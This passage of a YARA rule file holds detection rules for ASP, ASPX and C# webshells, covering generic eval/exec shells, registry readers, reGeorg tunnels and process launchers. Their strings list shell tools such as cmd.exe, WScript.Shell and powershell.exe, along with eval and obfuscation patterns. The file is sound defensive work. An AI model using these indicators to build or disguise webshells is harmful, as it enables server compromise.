        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
        $asp_multi_payload_one2 = "addcode" fullword wide ascii
        $asp_multi_payload_one3 = /\.run\b/ wide ascii
        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
        $asp_multi_payload_three2 = "Process" fullword wide ascii
        $asp_multi_payload_three3 = ".Start" wide ascii
        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii

        // execute cmd.exe /c with arguments using ProcessStartInfo
        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
        $asp_multi_payload_five2 = ".Start" nocase wide ascii
        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii


        //strings from private rule capa_asp_write_file
        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
        $asp_always_write1 = /\.write/ nocase wide ascii
        $asp_always_write2 = /\.swrite/ nocase wide ascii
        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
        $asp_cr_write1 = "CreateObject(" nocase wide ascii
        $asp_cr_write2 = "CreateObject (" nocase wide ascii
        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
        $asp_streamwriter2 = "filestream" fullword nocase wide ascii

    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        and not 1 of ( $fp* ) and not (
        uint16(0) == 0x5a4d or
        $dex at 0 or
        $pack at 0 or
        // fp on jar with zero compression
        uint16(0) == 0x4b50
        )
        and
        ( filesize < 700 and
        ( (
            any of ( $asp_payload* ) or
        all of ( $asp_multi_payload_one* ) or
        all of ( $asp_multi_payload_two* ) or
        all of ( $asp_multi_payload_three* ) or
        all of ( $asp_multi_payload_four* ) or
        all of ( $asp_multi_payload_five* )
        )
        or (
        any of ( $asp_always_write* ) and
        (
            any of ( $asp_write_way_one* ) and
            any of ( $asp_cr_write* )
        ) or (
            any of ( $asp_streamwriter* )
        )
        )
        ) )
}

rule WEBSHELL_ASP_Generic : FILE {
    meta:
        description = "Generic ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021-03-07"
        modified = "2023-07-05"
        score = 60
        hash = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
        hash = "4cf6fbad0411b7d33e38075f5e00d4c8ae9ce2f6f53967729974d004a183b25c"
        hash = "a91320483df0178eb3cafea830c1bd94585fc896"
        hash = "f3398832f697e3db91c3da71a8e775ebf66c7e73"
        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
    strings:
        $asp_much_sus7  = "Web Shell" nocase
        $asp_much_sus8  = "WebShell" nocase
        $asp_much_sus3  = "hidded shell"
        $asp_much_sus4  = "WScript.Shell.1" nocase
        $asp_much_sus5  = "AspExec"
        $asp_much_sus14 = "\\pcAnywhere\\" nocase
        $asp_much_sus15 = "antivirus" nocase
        $asp_much_sus16 = "McAfee" nocase
        $asp_much_sus17 = "nishang"
        $asp_much_sus18 = "\"unsafe" fullword wide ascii
        $asp_much_sus19 = "'unsafe" fullword wide ascii
        $asp_much_sus28 = "exploit" fullword wide ascii
        $asp_much_sus30 = "TVqQAAMAAA" wide ascii
        $asp_much_sus31 = "HACKED" fullword wide ascii
        $asp_much_sus32 = "hacked" fullword wide ascii
        $asp_much_sus33 = "hacker" wide ascii
        $asp_much_sus34 = "grayhat" nocase wide ascii
        $asp_much_sus35 = "Microsoft FrontPage" wide ascii
        $asp_much_sus36 = "Rootkit" wide ascii
        $asp_much_sus37 = "rootkit" wide ascii
        $asp_much_sus38 = "/*-/*-*/" wide ascii
        $asp_much_sus39 = "u\"+\"n\"+\"s" wide ascii
        $asp_much_sus40 = "\"e\"+\"v" wide ascii
        $asp_much_sus41 = "a\"+\"l\"" wide ascii
        $asp_much_sus42 = "\"+\"(\"+\"" wide ascii
        $asp_much_sus43 = "q\"+\"u\"" wide ascii
        $asp_much_sus44 = "\"u\"+\"e" wide ascii
        $asp_much_sus45 = "/*//*/" wide ascii
        $asp_much_sus46 = "(\"/*/\"" wide ascii
        $asp_much_sus47 = "eval(eval(" wide ascii
        $asp_much_sus48 = "Shell.Users" wide ascii
        $asp_much_sus49 = "PasswordType=Regular" wide ascii
        $asp_much_sus50 = "-Expire=0" wide ascii
        $asp_much_sus51 = "sh\"&\"el" wide ascii

        $asp_gen_sus1  = /:\s{0,20}eval}/ nocase wide ascii
        $asp_gen_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
        $asp_gen_sus6  = "self.delete"
        $asp_gen_sus9  = "\"cmd /c" nocase
        $asp_gen_sus10 = "\"cmd\"" nocase
        $asp_gen_sus11 = "\"cmd.exe" nocase
        $asp_gen_sus12 = "%comspec%" wide ascii
        $asp_gen_sus13 = "%COMSPEC%" wide ascii
        //TODO:$asp_gen_sus12 = ".UserName" nocase
        $asp_gen_sus18 = "Hklm.GetValueNames();" nocase
        // bonus string for proxylogon exploiting webshells
        $asp_gen_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
        $asp_gen_sus21 = "\"upload\"" wide ascii
        $asp_gen_sus22 = "\"Upload\"" wide ascii
        $asp_gen_sus25 = "shell_" wide ascii
        //$asp_gen_sus26 = "password" fullword wide ascii
        //$asp_gen_sus27 = "passw" fullword wide ascii
        // own base64 or base 32 func
        $asp_gen_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
        $asp_gen_sus30 = "abcdefghijklmnopqrstuvwxyz234567" fullword wide ascii
        $asp_gen_sus31 = "serv-u" wide ascii
        $asp_gen_sus32 = "Serv-u" wide ascii
        $asp_gen_sus33 = "Army" fullword wide ascii

        $asp_slightly_sus1 = "<pre>" wide ascii
        $asp_slightly_sus2 = "<PRE>" wide ascii


        // "e"+"x"+"e"
        $asp_gen_obf1 = "\"+\"" wide ascii

        $fp1 = "DataBinder.Eval"
        $fp2 = "B2BTools"
        $fp3 = "<b>Failed to execute cache update. See the log file for more information" ascii
        $fp4 = "Microsoft. All rights reserved."

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_bin_files
        $dex   = { 64 65 ( 78 | 79 ) 0a 30 }
        $pack  = { 50 41 43 4b 00 00 00 02 00 }

        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

        //strings from private rule capa_asp_payload
        $asp_payload0  = "eval_r" fullword nocase wide ascii
        $asp_payload1  = /\beval\s/ nocase wide ascii
        $asp_payload2  = /\beval\(/ nocase wide ascii
        $asp_payload3  = /\beval\"\"/ nocase wide ascii
        // var Fla = {'E':eval};  Fla.E(code)
        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
        $asp_multi_payload_one2 = "addcode" fullword wide ascii
        $asp_multi_payload_one3 = /\.run\b/ wide ascii
        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
        $asp_multi_payload_three2 = "Process" fullword wide ascii
        $asp_multi_payload_three3 = "Start" fullword wide ascii
        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii

        // execute cmd.exe /c with arguments using ProcessStartInfo
        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
        $asp_multi_payload_five2 = ".Start" nocase wide ascii
        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii


        //strings from private rule capa_asp_write_file
        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
        $asp_always_write1 = /\.write/ nocase wide ascii
        $asp_always_write2 = /\.swrite/ nocase wide ascii
        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
        $asp_cr_write1 = "CreateObject(" nocase wide ascii
        $asp_cr_write2 = "CreateObject (" nocase wide ascii
        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
        $asp_streamwriter2 = "filestream" fullword nocase wide ascii

        //strings from private rule capa_asp_classid
        $tagasp_capa_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_capa_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_capa_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_capa_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_capa_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii

    condition:
        //any of them or
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and not (
        uint16(0) == 0x5a4d or
        $dex at 0 or
        $pack at 0 or
        // fp on jar with zero compression
        uint16(0) == 0x4b50
        )
        and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        and (
            any of ( $asp_payload* ) or
        all of ( $asp_multi_payload_one* ) or
        all of ( $asp_multi_payload_two* ) or
        all of ( $asp_multi_payload_three* ) or
        all of ( $asp_multi_payload_four* ) or
        all of ( $asp_multi_payload_five* )
        )
        and not any of ( $fp* ) and
        ( ( filesize < 3KB and
        ( 1 of ( $asp_slightly_sus* ) ) ) or
        ( filesize < 25KB and
        ( 1 of ( $asp_much_sus* ) or 1 of ( $asp_gen_sus* ) or
        ( #asp_gen_obf1 > 2 ) ) ) or
        ( filesize < 50KB and
        ( 1 of ( $asp_much_sus* ) or 3 of ( $asp_gen_sus* ) or
        ( #asp_gen_obf1 > 6 ) ) ) or
        ( filesize < 150KB and
        ( 1 of ( $asp_much_sus* ) or 4 of ( $asp_gen_sus* ) or
        ( #asp_gen_obf1 > 6 ) or
        ( (
        any of ( $asp_always_write* ) and
        (
            any of ( $asp_write_way_one* ) and
            any of ( $asp_cr_write* )
        ) or (
            any of ( $asp_streamwriter* )
        )
        )
        and
        ( 1 of ( $asp_much_sus* ) or 2 of ( $asp_gen_sus* ) or
        ( #asp_gen_obf1 > 3 ) ) ) ) ) or
        ( filesize < 100KB and (
        any of ( $tagasp_capa_classid* )
        )
        ) )
}

rule WEBSHELL_ASP_Generic_Registry_Reader
{
    meta:
        description = "Generic ASP webshell which reads the registry (might look for passwords, license keys, database settings, general recon, ..."
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        date = "2021/03/14"
        modified = "2023-07-05"
        score = 50
        hash = "4d53416398a89aef3a39f63338a7c1bf2d3fcda4"
        hash = "f85cf490d7eb4484b415bea08b7e24742704bdda"
        hash = "898ebfa1757dcbbecb2afcdab1560d72ae6940de"

        id = "02d6f95f-1801-5fb0-8ab8-92176cf2fdd7"
    strings:
        /* $asp_reg1  = "Registry" fullword wide ascii */ /* too many matches issues */
        $asp_reg2  = "LocalMachine" fullword wide ascii
        $asp_reg3  = "ClassesRoot" fullword wide ascii
        $asp_reg4  = "CurrentUser" fullword wide ascii
        $asp_reg5  = "Users" fullword wide ascii
        $asp_reg6  = "CurrentConfig" fullword wide ascii
        $asp_reg7  = "Microsoft.Win32" fullword wide ascii
        $asp_reg8  = "OpenSubKey" fullword wide ascii

        $sus1 = "shell" fullword nocase wide ascii
        $sus2 = "cmd.exe" fullword wide ascii
        $sus3 = "<form " wide ascii
        $sus4 = "<table " wide ascii
        $sus5 = "System.Security.SecurityException" wide ascii

        $fp1 = "Avira Operations GmbH" wide

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


        //strings from private rule capa_asp_input
        // Request.BinaryRead
        // Request.Form
        $asp_input1 = "request" fullword nocase wide ascii
        $asp_input2 = "Page_Load" fullword nocase wide ascii
        // base64 of Request.Form(
        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
        $asp_xml_method1 = "GET" fullword wide ascii
        $asp_xml_method2 = "POST" fullword wide ascii
        $asp_xml_method3 = "HEAD" fullword wide ascii
        // dynamic form
        $asp_form1 = "<form " wide ascii
        $asp_form2 = "<Form " wide ascii
        $asp_form3 = "<FORM " wide ascii
        $asp_asp   = "<asp:" wide ascii
        $asp_text1 = ".text" wide ascii
        $asp_text2 = ".Text" wide ascii

    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and all of ( $asp_reg* ) and any of ( $sus* ) and not any of ( $fp* ) and
        ( filesize < 10KB or
        ( filesize < 150KB and (
            any of ( $asp_input* ) or
        (
            $asp_xml_http and
            any of ( $asp_xml_method* )
        ) or
        (
            any of ( $asp_form* ) and
            any of ( $asp_text* ) and
            $asp_asp
        )
        )
        ) )
}

rule WEBSHELL_ASPX_Regeorg_CSHARP
{
    meta:
        description = "Webshell regeorg aspx c# version"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        reference = "https://github.com/sensepost/reGeorg"
        hash = "c1f43b7cf46ba12cfc1357b17e4f5af408740af7ae70572c9cf988ac50260ce1"
        author = "Arnim Rupp (https://github.com/ruppde)"
        score = 75
        date = "2021/01/11"
        modified = "2023-07-05"
        hash = "479c1e1f1c263abe339de8be99806c733da4e8c1"
        hash = "38a1f1fc4e30c0b4ad6e7f0e1df5a92a7d05020b"
        hash = "e54f1a3eab740201feda235835fc0aa2e0c44ba9"
        hash = "aea0999c6e5952ec04bf9ee717469250cddf8a6f"

        id = "0a53d368-5f1b-55b7-b08f-36b0f8c5612f"
    strings:
        $input_sa1 = "Request.QueryString.Get" fullword nocase wide ascii
        $input_sa2 = "Request.Headers.Get" fullword nocase wide ascii
        $sa1 = "AddressFamily.InterNetwork" fullword nocase wide ascii
        $sa2 = "Response.AddHeader" fullword nocase wide ascii
        $sa3 = "Request.InputStream.Read" nocase wide ascii
        $sa4 = "Response.BinaryWrite" nocase wide ascii
        $sa5 = "Socket" nocase wide ascii
        $georg = "Response.Write(\"Georg says, 'All seems fine'\")"

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


    condition:
        filesize < 300KB and (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
                $php2 at 0
            ) or (
                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
                )
        )
        )
        and
        ( $georg or
        ( all of ( $sa* ) and any of ( $input_sa* ) ) )
}

rule WEBSHELL_CSHARP_Generic
{
    meta:
        description = "Webshell in c#"
        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
        author = "Arnim Rupp (https://github.com/ruppde)"
        reference = "Internal Research"
        score = 75
        hash = "b6721683aadc4b4eba4f081f2bc6bc57adfc0e378f6d80e2bfa0b1e3e57c85c7"
        date = "2021/01/11"
        modified = "2023-07-05"
        hash = "4b365fc9ddc8b247a12f4648cd5c91ee65e33fae"
        hash = "019eb61a6b5046502808fb5ab2925be65c0539b4"
        hash = "620ee444517df8e28f95e4046cd7509ac86cd514"
        hash = "a91320483df0178eb3cafea830c1bd94585fc896"

        id = "6d38a6b0-b1d2-51b0-9239-319f1fea7cae"
    strings:
        $input_http = "Request." nocase wide ascii
        $input_form1 = "<asp:" nocase wide ascii
        $input_form2 = ".text" nocase wide ascii
        $exec_proc1 = "new Process" nocase wide ascii
        $exec_proc2 = "start(" nocase wide ascii
        $exec_shell1 = "cmd.exe" nocase wide ascii
        $exec_shell2 = "powershell.exe" nocase wide ascii

        //strings from private rule capa_asp
        $tagasp_short1 = /<%[^"]/ wide ascii
        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
        $tagasp_short2 = "%>" wide ascii

        // classids for scripting host etc
        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
        $tagasp_long10 = "<%@ " wide ascii
        // <% eval
        $tagasp_long11 = /<% \w/ nocase wide ascii
        $tagasp_long12 = "<%ex" nocase wide ascii
        $tagasp_long13 = "<%ev" nocase wide ascii

        // <%@ LANGUAGE = VBScript.encode%>
        // <%@ Language = "JScript" %>

        // <%@ WebHandler Language="C#" class="Handler" %>
        // <%@ WebService Language="C#" Class="Service" %>

        // <%@Page Language="Jscript"%>
        // <%@ Page Language = Jscript %>
        // <%@PAGE LANGUAGE=JSCRIPT%>
        // <%@ Page Language="Jscript" validateRequest="false" %>
        // <%@ Page Language = Jscript %>
        // <%@ Page Language="C#" %>
        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
        // <script runat="server" language="JScript">
        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
        // <msxsl:script language="JScript" ...
        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii

        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii

        // avoid hitting php
        $php1 = "<?php"
        $php2 = "<?="

        // avoid hitting jsp
        $jsp1 = "=\"java." wide ascii
        $jsp2 = "=\"javax." wide ascii
        $jsp3 = "java.lang." wide ascii
        $jsp4 = "public" fullword wide ascii
        $jsp5 = "throws" fullword wide ascii
        $jsp6 = "getValue" fullword wide ascii
        $jsp7 = "getBytes" fullword wide ascii

        $perl1 = "PerlScript" fullword


    condition:
        (
        (
            any of ( $tagasp_long* ) or
            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
            any of ( $tagasp_classid* ) or
            (
                $tagasp_short1 and
                $tagasp_short2 in ( filesize-100..filesize )
            ) or (
                $tagasp_short2 and (
                    $tagasp_short1 in ( 0..1000 ) or
                    $tagasp_short1 in ( filesize-1000..filesize )
                )
            )
        ) and not (
            (
                any of ( $perl* ) or
                $php1 at 0 or
